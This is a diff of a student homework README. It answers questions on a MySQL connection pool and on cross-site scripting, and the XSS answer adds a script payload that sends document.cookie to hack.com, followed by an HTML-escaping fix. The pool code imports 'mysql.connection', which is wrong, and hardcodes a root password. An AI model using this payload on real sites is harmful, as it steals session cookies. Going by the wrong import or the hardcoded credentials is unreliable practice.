@@ -185,10 +185,33 @@ A4-1:connection pool 又叫做連接池，是一個有關於後端與資料庫�
 
 Q4-2: How to create a Connection Pool by the official mysql-connector-python package? <br>
 A4-2:
+```
+from mysql.connection import pooling
+pool = pooling.MySQLConnectionPool(
+  pool_name="connpool",
+  pool_size=5,
+  host="localhost",
+  user="root",
+  password="12345678",
+  database="website"
+)
+```
 
 Q4-3: If we want to make database operations, we get a connection from Connection Pool, execute SQL statements, and finally return connection back to the Connection Pool. Demo your code which implements the above procedure. <br>
 A4-3:
+```
+def get_member():
+  conn=pool.get_connection() # 取得連線
+  cursor=conn.cursor(dictionary=True)
 
+  cursor.execute("SELECT * FROM member")
+  result= cursor.fetchall()
+
+  cursor.close()
+  conn.close() # 返回pool
+
+  return result
+```
 ## Task5 - Cross-Site Scripting(XSS)
 Cross-Site Scripting (XSS) is one of the most common attack methods. Try to study the basic concept, replicate the attack steps, and tell us how to prevent this kind of attack from the developer’s view.<br>
 
@@ -229,8 +252,28 @@ A5-1:中文叫作跨網站指令碼，是一種網路攻擊，攻擊者通常會
   ```
 
 Q5-2: You are a hacker! Design and do a real XSS attack on a web system. Show us your work. <br>
-A5-2:
+A5-2: 
+```
+<div>
+  ${  message.content }
+</div>
+```
+php-template
+```
+<script>document.location="https://hack.com/steal?cookie="+document.cookie</script>
+```
 
 Q5-3: Based on the scenario you did in the previous step, how could it be prevented? <br>
-A5-3:
+A5-3:利用HTML Escape (又稱為跳脫字元，意即將具有特殊語義的字符(如<、>、&)轉換成其對應的轉義字元(如 &lt;、&gt;、&amp;)) 把內容轉換成純文字，而不是程式碼。如下範例
+```
+  echo htmlspecialchars($str, ENT_QUOTES, 'utf-8')  // php跳脫字元內建函式 htmlspecialchars
+//  輸出時需要 encoding
+& -- > &amp;
+< -- > &lt;
+> -- > &gt;
+" -- > &quot;
+' -- > &#x27;
+/ -- > &#x2F;
+```
+
 
